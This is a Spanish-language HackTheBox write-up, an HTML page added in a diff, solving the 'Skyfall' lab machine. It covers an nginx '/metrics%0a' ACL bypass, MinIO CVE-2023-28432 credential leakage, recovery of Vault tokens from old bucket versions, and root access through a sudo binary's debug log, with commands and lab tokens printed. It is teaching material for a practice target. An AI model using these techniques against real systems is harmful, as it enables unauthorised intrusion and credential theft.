@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <title>Skyfall HTB - Writeup</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="description" content="Writeup de Skyfall (HackTheBox): SSRF y bypass de rutas contra MinIO (CVE-2023-28432), versionado de buckets, pivote a HashiCorp Vault y abuso de un binario sudo hasta root." />
+  <meta name="color-scheme" content="dark" />
+  <link rel="icon" href="../img/avatar.png" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="../styles.css?v=3" />
+</head>
+<body>
+  <div class="post-layout">
+    <aside class="post-sidebar">
+      <div class="sidebar-avatar">
+        <img src="../img/avatar.png" alt="Avatar de ZerasedZ" />
+      </div>
+      <h2 class="sidebar-name">ZerasedZ</h2>
+      <p class="sidebar-role">HTB - Offensive Security</p>
+
+      <ul class="sidebar-list">
+        <li>HTB</li>
+        <li>Linux · Web</li>
+      </ul>
+
+      <ul class="sidebar-links">
+        <li><a href="https://profile.hackthebox.com/profile/019d4be4-ec1e-706b-9196-b4be2dab6db5">HTB</a></li>
+        <li><a href="https://twitter.com">Twitter</a></li>
+        <li><a href="https://github.com/JeinerGutierrez">GitHub</a></li>
+      </ul>
+
+      <a class="back-home" href="../index.html">&larr; Volver a Writeups</a>
+    </aside>
+
+    <main class="post-main">
+      <header class="post-header">
+        <p class="post-breadcrumb"><a href="../index.html">Home</a> / Skyfall HTB - Writeup</p>
+        <h1 class="post-title">Skyfall HTB - Writeup</h1>
+        <p class="post-date">Jul 08, 2026 · <span class="pill">Linux</span> <span class="pill">Web</span> <span class="pill">Hard</span></p>
+      </header>
+
+      <nav class="post-toc" aria-label="Contenido del writeup">
+        <h2>En este writeup</h2>
+        <ol class="post-index">
+          <li><a href="#enumeracion">1. Enumeración inicial</a></li>
+          <li><a href="#reconocimiento-web">2. Reconocimiento web y vhosts</a></li>
+          <li><a href="#acceso-demo">3. Acceso a Sky Storage</a></li>
+          <li><a href="#explorando-app">4. Explorando la aplicación</a></li>
+          <li><a href="#bypass-metrics">5. Bypass del endpoint /metrics</a></li>
+          <li><a href="#cve-minio">6. CVE-2023-28432 en MinIO</a></li>
+          <li><a href="#minio-client">7. Acceso a MinIO con mc</a></li>
+          <li><a href="#versionado">8. Versionado de buckets</a></li>
+          <li><a href="#vault">9. Pivote a HashiCorp Vault</a></li>
+          <li><a href="#ssh-otp">10. Bypass de política y SSH OTP</a></li>
+          <li><a href="#privesc">11. Escalada de privilegios</a></li>
+          <li><a href="#conclusion">12. Conclusión</a></li>
+        </ol>
+      </nav>
+
+      <section class="post-section">
+        <h2>El día de hoy vamos a resolver la máquina Skyfall de HackTheBox. Es una máquina Linux - Hard, con una cadena bastante larga: parte de una app web (Sky Storage) montada sobre MinIO, sigue con un bypass de ACL, una fuga de credenciales en MinIO, un pivote a HashiCorp Vault y termina con el abuso de un binario con sudo mal configurado.</h2>
+        <img src="skyfall/img-pag2.png" alt="Landing page corporativa de Skyfall - Sky Storage en el puerto 80" />
+
+        <h2 id="enumeracion">1. Enumeración inicial</h2>
+        <p>Como siempre, empezamos con un escaneo de puertos completo con nmap:</p>
+        <pre><code>nmap -p- --min-rate 10000 10.129.5.22</code></pre>
+        <p>Y luego un escaneo de versiones sobre los puertos que encontremos abiertos:</p>
+        <pre><code>nmap -p 22,80 -sCV 10.129.5.22</code></pre>
+        <img src="skyfall/img-nmap1.png" alt="Resultado de nmap: puerto 22 OpenSSH 8.9p1 y puerto 80 nginx 1.18.0 con el título Skyfall - Introducing Sky Storage" />
+        <p>Solo dos puertos abiertos: 22 (OpenSSH 8.9p1 sobre Ubuntu) y 80 (nginx 1.18.0). El título de la página ya nos regala el nombre de dominio: <code>Skyfall - Introducing Sky Storage!</code>.</p>
+
+        <h2 id="reconocimiento-web">2. Reconocimiento web y vhosts</h2>
+        <p>Agregamos <code>skyfall.htb</code> a nuestro <code>/etc/hosts</code> y entramos por el navegador. Nos encontramos con una landing page corporativa bastante genérica, del estilo "empresa de almacenamiento en la nube".</p>
+        <img src="skyfall/img-etchosts3.png" alt="/etc/hosts con la entrada skyfall.htb y demo.skyfall.htb apuntando a 10.129.5.22" />
+        <p>No hay mucho más que ver a nivel de contenido en el dominio principal, así que probamos fuzzing de subdominios (virtual hosting) usando el Host header:</p>
+        <pre><code>ffuf -u http://10.129.5.22 -H "Host: FUZZ.skyfall.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac</code></pre>
+        <img src="skyfall/img-ffuz4.png" alt="ffuf encontrando el subdominio demo con un código de respuesta 302" />
+        <p>Encontramos el subdominio <code>demo</code>, que responde con un 302. Lo agregamos también al <code>/etc/hosts</code> y vamos a ver qué hay ahí.</p>
+
+        <h2 id="acceso-demo">3. Acceso a Sky Storage</h2>
+        <p>El subdominio <code>demo.skyfall.htb</code> nos lleva a un login llamado "Sky Storage - Demo", y convenientemente nos dan las credenciales en la misma pantalla: <code>guest / guest</code>.</p>
+        <img src="skyfall/img-logindemo5.png" alt="Formulario de login de Sky Storage Demo con credenciales guest/guest visibles" />
+        <p>Con esas credenciales entramos sin problema al dashboard de la aplicación. Se trata de un panel hecho en Flask que expone una interfaz para gestionar archivos sobre un backend de almacenamiento tipo S3 (spoiler: es MinIO). En la barra lateral vemos las secciones Dashboard, Files, Beta Features, URL Fetch, MinIO Metrics, Feedback y Escalate.</p>
+        <img src="skyfall/img-logeado6.png" alt="Dashboard de Sky Storage tras iniciar sesión como guest, con menú lateral Files, Beta Features, URL Fetch, MinIO Metrics, Feedback y Escalate" />
+
+        <h2 id="explorando-app">4. Explorando la aplicación</h2>
+        <p>Antes de lanzarnos a atacar, vale la pena recorrer toda la superficie de la app para entender qué hace cada funcionalidad.</p>
+        <p>En <strong>Files</strong> tenemos nuestros propios archivos como usuario guest, incluyendo un <code>Welcome.pdf</code> de bienvenida y la opción de subir, descargar, renombrar y borrar archivos.</p>
+        <img src="skyfall/img-pdf6.png" alt="Welcome.pdf descargado desde la sección Files de Sky Storage" />
+        <img src="skyfall/img-subidadearchivo7.png" alt="Sección Files mostrando los uploads del usuario guest con acciones de descarga, borrado y renombrado" />
+        <p>En <strong>Beta Features</strong> nos topamos con un 403: es una sección restringida a otro rol.</p>
+        <img src="skyfall/img-beta8.png" alt="Página 403 Forbidden al intentar acceder a Beta Features" />
+        <p><strong>URL Fetch</strong> es la que más llama la atención: un formulario que pide una URL y la descarga al storage. Un candidato clásico a SSRF, lo dejamos anotado para más adelante.</p>
+        <img src="skyfall/img-fetch9.png" alt="Formulario URL Fetch de Sky Storage para descargar un archivo remoto" />
+        <p><strong>Feedback</strong> y <strong>Escalate</strong> son formularios de contacto hacia el equipo de soporte: uno para dejar comentarios y otro para escalar un ticket al admin. Los probamos, pero solo obtenemos una respuesta automática avisando que hay que esperar 24 horas.</p>
+        <img src="skyfall/img-feedback10.png" alt="Formulario de Feedback de Sky Storage" />
+        <img src="skyfall/img-escalate11.png" alt="Formulario Contact Admin en la sección Escalate" />
+        <img src="skyfall/img-contacadmin12.png" alt="Respuesta automática pidiendo esperar 24 horas tras contactar al admin" />
+        <p>Quedan como superficie de ataque pendiente, pero por ahora el camino más prometedor es MinIO Metrics + URL Fetch.</p>
+
+        <h2 id="bypass-metrics">5. Bypass del endpoint /metrics</h2>
+        <p>Lanzamos un descubrimiento de contenido completo contra <code>demo.skyfall.htb</code>:</p>
+        <pre><code>feroxbuster -u http://demo.skyfall.htb/ -w /usr/share/feroxbuster/raft-medium-directories.txt -x --recursion-depth 4</code></pre>
+        <img src="skyfall/img-feroxbuster13.png" alt="feroxbuster listando rutas de demo.skyfall.htb, incluyendo /metrics con un 403" />
+        <p>Entre los assets estáticos aparece <code>/metrics</code> devolviendo un 403: hay un endpoint interno bloqueado a propósito por el proxy. Interceptamos la petición con Burp para intentar un bypass y comprobamos que nginx no normaliza ciertos caracteres de espacio en blanco (como un salto de línea) antes de reenviar la ruta a Flask. Si al path le agregamos uno de esos caracteres, la comparación exacta del proxy (<code>location = /metrics</code>) deja de coincidir y el bloqueo no se aplica, pero Flask sigue resolviendo la misma vista.</p>
+        <img src="skyfall/img-burp14.png" alt="Petición en Burp Suite (vista Hex) mostrando un byte extra inyectado justo después de /metrics" />
+        <img src="skyfall/img-burp15.png" alt="Respuesta en Burp Suite renderizando la página MinIO Internal Metrics tras el bypass" />
+        <p>La respuesta renderiza una vista interna: "MinIO Internal Metrics". Repetimos el mismo truco directo desde el navegador con un salto de línea codificado (<code>%0a</code>):</p>
+        <pre><code>http://demo.skyfall.htb/metrics%0a</code></pre>
+        <p>Y entramos a la misma vista ya autenticados, ahora con más comodidad para leerla.</p>
+        <img src="skyfall/img-metric18.png" alt="Vista MinIO Internal Metrics dentro de Sky Storage mostrando métricas de minio-node1 y minio-node2" />
+        <p>Ahí aparecen nombres internos: <code>minio-node1</code> y <code>minio-node2</code>, en el puerto 9000. Agregamos un hostname que ya intuimos por convención (<code>prd23-s3-backend.skyfall.htb</code>) al <code>/etc/hosts</code> y probamos pegarle directo al endpoint público de métricas de MinIO:</p>
+        <img src="skyfall/img-newhost16.png" alt="/etc/hosts con la nueva entrada prd23-s3-backend.skyfall.htb" />
+        <img src="skyfall/img-page17.png" alt="Endpoint /minio/v2/metrics/cluster de MinIO respondiendo sin autenticación con métricas en formato Prometheus" />
+        <p>El endpoint <code>/minio/v2/metrics/cluster</code> responde sin pedir autenticación (MinIO trae <code>MINIO_PROMETHEUS_AUTH_TYPE=public</code> por defecto), confirmando que estamos hablando directo con el backend de almacenamiento.</p>
+
+        <h2 id="cve-minio">6. CVE-2023-28432 en MinIO</h2>
+        <p>Con la versión de MinIO identificada nos ponemos a buscar vulnerabilidades conocidas y aparece un historial de CVEs relacionados con fugas de información y del manejo de credenciales root.</p>
+        <img src="skyfall/img-vulne19.png" alt="Ficha de CVE en un boletín de INCIBE sobre una vulnerabilidad de MinIO relacionada con las credenciales root" />
+        <p>El fallo que realmente nos sirve aquí es <strong>CVE-2023-28432</strong>: un endpoint interno de bootstrap entre nodos del clúster (<code>/minio/bootstrap/v1/verify</code>), pensado solo para comunicación nodo-a-nodo, puede ser consultado directamente y devuelve toda la configuración de entorno del clúster en texto plano, incluyendo las credenciales root.</p>
+        <p>Al explotarlo obtenemos un volcado de configuración con las variables de entorno de MinIO:</p>
+        <img src="skyfall/img-credenciales20.png" alt="Respuesta JSON del endpoint de bootstrap de MinIO filtrando MINIO_ROOT_USER y MINIO_ROOT_PASSWORD en texto plano" />
+        <p>Entre las variables filtradas están <code>MINIO_ROOT_USER</code> y <code>MINIO_ROOT_PASSWORD</code>, las credenciales root del clúster completo de MinIO.</p>
+
+        <h2 id="minio-client">7. Acceso a MinIO con mc</h2>
+        <p>Con credenciales root de MinIO en mano, descargamos el cliente oficial <code>mc</code> para gestionar el storage por consola:</p>
+        <pre><code>curl https://dl.min.io/client/mc/release/linux-amd64/mc \
+--create-dirs \
+-o $HOME/minio-binaries/mc</code></pre>
+        <img src="skyfall/img-curl21.png" alt="Descarga del binario mc (MinIO Client) con curl" />
+        <pre><code>chmod +x $HOME/minio-binaries/mc
+export PATH=$PATH:$HOME/minio-binaries/</code></pre>
+        <img src="skyfall/img-cmod22.png" alt="Dando permisos de ejecución a mc y agregándolo al PATH" />
+        <p>Registramos un alias apuntando al backend interno con las credenciales filtradas:</p>
+        <pre><code>mc alias set skyfall http://prd23-s3-backend.skyfall.htb 5GrE1B2YGGyZzNHZaIww GkpjkmiVmpFuL2d3oRx0</code></pre>
+        <img src="skyfall/img-accessus23.png" alt="mc alias set autenticando correctamente contra prd23-s3-backend.skyfall.htb con las credenciales root de MinIO" />
+        <p>Listamos los buckets disponibles y aparece un bucket por cada usuario de la aplicación:</p>
+        <pre><code>mc ls skyfall</code></pre>
+        <img src="skyfall/img-mc24.png" alt="mc ls listando los buckets askyy, btanner, emoneypenny, gmallory, guest, jbond, omansfield y rsilva" />
+        <p>Los nombres (askyy, btanner, emoneypenny, gmallory, jbond, omansfield, rsilva) son en realidad un guiño a personajes de la película Skyfall de James Bond. Listamos el contenido recursivo de todos los buckets:</p>
+        <pre><code>mc ls --recursive skyfall</code></pre>
+        <img src="skyfall/img-r25.png" alt="mc ls --recursive mostrando el Welcome.pdf de cada usuario y un archivo home_backup.tar.gz en el bucket de askyy" />
+        <p>Todos los usuarios tienen únicamente su <code>Welcome.pdf</code>, excepto <strong>askyy</strong>, que tiene además un <code>home_backup.tar.gz</code>: un backup de su directorio home. Lo bajamos:</p>
+        <pre><code>mc cp skyfall/askyy/home_backup.tar.gz .</code></pre>
+        <img src="skyfall/img-baje26.png" alt="Descargando home_backup.tar.gz del bucket de askyy con mc cp" />
+        <p>Lo extraemos para revisar su contenido:</p>
+        <pre><code>mkdir -p home_backup
+tar xzf home_backup.tar.gz -C home_backup/
+ls -la home_backup/</code></pre>
+        <img src="skyfall/img-targz27.png" alt="Contenido extraído de home_backup.tar.gz: .bash_history vacío, .bashrc, .ssh y .sudo_as_admin_successful" />
+        <p>A simple vista es un home bastante limpio: <code>.bash_history</code> casi vacío, <code>.bashrc</code>, <code>.ssh</code>, nada que llame demasiado la atención todavía.</p>
+
+        <h2 id="versionado">8. Versionado de buckets: recuperando secretos borrados</h2>
+        <p>Como el backend es MinIO, y MinIO soporta versionado de objetos al estilo S3, vale la pena revisar si existen versiones anteriores de ese mismo archivo:</p>
+        <pre><code>mc ls -r --versions skyfall</code></pre>
+        <img src="skyfall/img-version28.png" alt="mc ls -r --versions mostrando tres versiones de askyy/home_backup.tar.gz: v1 de 1.2MiB, v2 de 2.6KiB y v3 de 2.5KiB" />
+        <p>Efectivamente, <code>home_backup.tar.gz</code> tiene tres versiones: la v1 pesa 1.2MiB, mucho más que la versión actual (2.5KiB). Alguien fue "limpiando" ese backup con el tiempo. Descargamos las versiones anteriores por su version-id:</p>
+        <pre><code>mc cp --version-id 2b75346d-2a47-4203-ab09-3c9f878466b8 skyfall/askyy/home_backup.tar.gz ./home_backup_v2.tar.gz
+mc cp --version-id 3c498578-8dfe-43b7-b679-32a3fe42018f skyfall/askyy/home_backup.tar.gz ./home_backup_v1.tar.gz</code></pre>
+        <img src="skyfall/img-versiones29.png" alt="Descargando las versiones antiguas v1 y v2 de home_backup.tar.gz usando mc cp --version-id" />
+        <p>Extraemos ambas versiones en carpetas separadas:</p>
+        <pre><code>mkdir home_backup_v2
+mkdir home_backup_v1
+tar -xf home_backup_v2.tar.gz -C home_backup_v2
+tar -xf home_backup_v1.tar.gz -C home_backup_v1</code></pre>
+        <img src="skyfall/img-mkdir30.png" alt="Extrayendo las versiones v1 y v2 del backup en carpetas separadas" />
+        <p>La v1 (la más antigua y pesada) trae bastante más contenido: un <code>.bash_history</code> real de 10KB y hasta una carpeta <code>terraform-generator</code> que no está en la versión actual.</p>
+        <img src="skyfall/img-mkdir31.png" alt="Comparando el home_backup v1 (con .bash_history completo y carpeta terraform-generator) contra la versión actual, mucho más vacía" />
+        <p>Comparamos el <code>.bashrc</code> de la versión intermedia (v2) contra el actual, por si quedó algo que después se borró:</p>
+        <pre><code>diff home_backup_v2/.bashrc home_backup/.bashrc</code></pre>
+        <img src="skyfall/img-fall32.png" alt="diff entre .bashrc de la versión v2 y la actual revelando un VAULT_API_ADDR y un VAULT_TOKEN exportados" />
+        <p>Bingo. La v2 exportaba dos variables de entorno que en la versión final ya no existen:</p>
+        <pre><code>export VAULT_API_ADDR="http://prd23-vault-internal.skyfall.htb"
+export VAULT_TOKEN="hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE"</code></pre>
+        <p>El versionado de MinIO nos permitió recuperar un token de HashiCorp Vault que el propio askyy había limpiado de su <code>.bashrc</code> en algún momento, pero que sigue viviendo en una versión anterior del backup.</p>
+
+        <h2 id="vault">9. Pivote a HashiCorp Vault</h2>
+        <p>Agregamos el nuevo hostname interno a <code>/etc/hosts</code> y exportamos las variables recuperadas:</p>
+        <img src="skyfall/img-newhost33.png" alt="/etc/hosts con la nueva entrada prd23-vault-internal.skyfall.htb" />
+        <pre><code>export VAULT_ADDR="http://prd23-vault-internal.skyfall.htb"
+export VAULT_API_ADDR="http://prd23-vault-internal.skyfall.htb"
+export VAULT_TOKEN="hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE"
+vault token lookup</code></pre>
+        <img src="skyfall/img-vault34.png" alt="vault token lookup mostrando un token válido con display_name token-askyy y política developers" />
+        <p>El token es válido, pertenece a <code>token-askyy</code> y tiene asociada la política <code>developers</code>. Intentamos listar los secret engines montados, pero la política no nos deja:</p>
+        <pre><code>vault secrets list</code></pre>
+        <img src="skyfall/img-deneg35.png" alt="vault secrets list devolviendo 403 permission denied" />
+        <p>Probamos a listar el path <code>ssh</code> directamente, ya que por el nombre huele a un secrets engine SSH:</p>
+        <pre><code>vault list ssh</code></pre>
+        <img src="skyfall/img-sshnovalue36.png" alt="vault list ssh devolviendo No value found at ssh" />
+        <p>No hay valor en la raíz, pero si probamos el subpath <code>roles</code> sí tenemos permiso de listar:</p>
+        <pre><code>vault list ssh/roles</code></pre>
+        <img src="skyfall/img-rolesssh37.png" alt="vault list ssh/roles mostrando los roles admin_otp_key_role y dev_otp_key_role" />
+        <p>Aparecen dos roles: <code>admin_otp_key_role</code> y <code>dev_otp_key_role</code>. Esto es el backend SSH de Vault en modo OTP (One-Time-Password): permite generar contraseñas de un solo uso para conectarse por SSH a un host sin exponer ninguna clave privada. Antes de usarlo, intentamos leer las políticas para saber exactamente qué permisos tenemos:</p>
+        <pre><code>vault token capabilities policies
+vault token capabilities policies/list
+vault token capabilities policies/read</code></pre>
+        <img src="skyfall/img-deny38.png" alt="vault token capabilities devolviendo deny para policies, policies/list y policies/read" />
+        <pre><code>vault policy list
+vault policy read default
+vault policy read developer</code></pre>
+        <img src="skyfall/img-nopermi39.png" alt="vault policy list y vault policy read devolviendo 403 permission denied vía la CLI" />
+        <p>Todo nos devuelve permission denied usando la CLI. La política <code>developers</code> no nos deja leer políticas por el path nuevo de la API (<code>sys/policies/acl/...</code>).</p>
+
+        <h2 id="ssh-otp">10. Bypass de política y acceso SSH vía OTP</h2>
+        <p>El truco está en que la política habla del path viejo (legacy) de Vault, no del nuevo que usa la CLI por defecto. Probamos consultarlo directo con curl contra el endpoint legacy <code>sys/policy/&lt;nombre&gt;</code>:</p>
+        <pre><code>curl -s -XGET "http://prd23-vault-internal.skyfall.htb/v1/sys/policy/developers" \
+  -H "X-Vault-Token: hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE" | jq .</code></pre>
+        <img src="skyfall/img-curl40.png" alt="curl consultando el endpoint legacy sys/policy/developers y devolviendo el contenido de la política en JSON" />
+        <p>Funciona: la política sí tiene permiso de <code>read</code> sobre <code>sys/policy/developers</code> (el path legacy), aunque no sobre <code>sys/policies/acl/developers</code> (el path nuevo que usa la CLI). Formateamos las reglas para leerlas mejor:</p>
+        <pre><code>curl -s -XGET "http://prd23-vault-internal.skyfall.htb/v1/sys/policy/developers" \
+  -H "X-Vault-Token: hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE" | jq '.rules' -r</code></pre>
+        <img src="skyfall/img-rules41.png" alt="Reglas de la política developers: read sobre sys/policy/developers, list sobre ssh/* y create/read/update sobre ssh/creds/dev_otp_key_role" />
+        <p>La política <code>developers</code> nos da <code>list</code> sobre <code>ssh/*</code> y, sobre todo, <code>create</code>, <code>read</code> y <code>update</code> en <code>ssh/creds/dev_otp_key_role</code>. Confirmamos el resumen de capacidades efectivas de nuestro token con:</p>
+        <pre><code>vault read sys/internal/ui/resultant-acl --format=json | jq -r .data</code></pre>
+        <img src="skyfall/img-data42.png" alt="vault read sys/internal/ui/resultant-acl mostrando los exact_paths permitidos, incluyendo ssh/creds/dev_otp_key_role" />
+        <p>Con eso claro, pedimos una credencial OTP para conectarnos como askyy usando el rol <code>dev_otp_key_role</code>:</p>
+        <pre><code>vault ssh -role dev_otp_key_role -mode otp askyy@skyfall.htb</code></pre>
+        <img src="skyfall/img-flaguser43.png" alt="vault ssh generando un OTP y logueando por SSH como askyy, mostrando la flag user.txt" />
+        <p>Vault genera un código OTP de un solo uso, lo usamos como contraseña de SSH y entramos directo como <code>askyy</code>. Ahí mismo capturamos la primera flag:</p>
+        <pre><code>cat user.txt</code></pre>
+
+        <h2 id="privesc">11. Escalada de privilegios</h2>
+        <p>Ya dentro como askyy, hacemos enumeración local rápida. Primero confirmamos que no hay más usuarios interactivos en el sistema:</p>
+        <pre><code>ls /home
+grep "sh$" /etc/passwd</code></pre>
+        <img src="skyfall/img-ls44.png" alt="ls /home mostrando que askyy es el único usuario con directorio home" />
+        <img src="skyfall/img-greap45.png" alt="grep sh$ /etc/passwd mostrando que solo root y askyy tienen shell interactiva" />
+        <p>Solo root y askyy tienen bash como shell, así que no hay más movimiento lateral posible: la escalada tiene que ser directa a root. Revisamos qué podemos ejecutar con sudo:</p>
+        <pre><code>sudo -l</code></pre>
+        <img src="skyfall/img-sudo-l46.png" alt="sudo -l mostrando permiso NOPASSWD sobre /root/vault/vault-unseal -c /etc/vault-unseal.yaml" />
+        <p>Podemos ejecutar como root, sin contraseña, un binario propio llamado <code>vault-unseal</code>, encargado de reabrir (unseal) el Vault interno usando un archivo de configuración. Miramos su ayuda:</p>
+        <pre><code>sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -h</code></pre>
+        <img src="skyfall/img-sudounseat47.png" alt="Ayuda del binario vault-unseal mostrando las flags -v/--verbose, -d/--debug y -c/--config" />
+        <p>Entre las opciones aparece un flag de depuración (<code>-d</code>/<code>--debug</code>) que promete "habilitar salida de debugging extra hacia un archivo". Como el binario corre con privilegios de root pero nosotros controlamos desde dónde se ejecuta, lo lanzamos en modo verbose + debug:</p>
+        <pre><code>sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -vd</code></pre>
+        <img src="skyfall/img-yaml48.png" alt="Ejecución de vault-unseal en modo verbose y debug mostrando el aviso Security Risk y el estado del Vault" />
+        <p>El propio binario advierte "Security Risk!" al leer el YAML: el archivo de configuración de auto-unseal contiene credenciales sensibles de Vault en texto plano, y al correr en modo debug esas credenciales terminan también en el log que el proceso escribe. Como ese log queda accesible en el directorio desde el que ejecutamos el comando, terminamos con un token de Vault de nivel root en nuestras manos.</p>
+        <p>Exportamos ese nuevo token y pedimos ahora una credencial OTP con el rol de administrador para conectarnos directamente como root a la máquina objetivo:</p>
+        <pre><code>export VAULT_ADDR="http://prd23-vault-internal.skyfall.htb"
+export VAULT_TOKEN="hvs.I0ewVsmaKU1SwVZAKR3T0mmG"
+vault ssh -role admin_otp_key_role -mode otp root@10.129.5.22</code></pre>
+        <img src="skyfall/img-root-txt49.png" alt="vault ssh con el rol admin_otp_key_role logueando como root en 10.129.5.22 y mostrando la flag root.txt" />
+        <p>Con el token root de Vault, el rol <code>admin_otp_key_role</code> sí nos permite generar un OTP para <code>root@10.129.5.22</code>. Entramos directo como root y leemos la flag final:</p>
+        <pre><code>cat root.txt</code></pre>
+
+        <h2 id="conclusion">12. Conclusión</h2>
+        <img src="skyfall/img-skyfallend50.png" alt="Pantalla de HackTheBox confirmando que la máquina Skyfall fue pwneada" />
+        <p>Skyfall resume bastante bien lo que significa auditar infraestructura moderna: no hubo un solo exploit "mágico", sino una cadena de configuraciones de infraestructura mal aisladas entre sí. Un bypass de ACL por diferencias de parseo entre nginx y Flask nos abrió la puerta a un endpoint interno de MinIO; ese endpoint filtró credenciales root por una vulnerabilidad conocida (CVE-2023-28432); el versionado de objetos de MinIO nos dejó recuperar un secreto de Vault que ya había sido "limpiado"; y una diferencia entre el API legacy y el API nuevo de Vault nos permitió leer una política que la CLI nos negaba. La escalada final fue, otra vez, un problema de confianza: un binario con sudo que loggea secretos en texto plano cuando se le pide más verbosidad.</p>
+      </section>
+    </main>
+  </div>
+</body>
+</html>
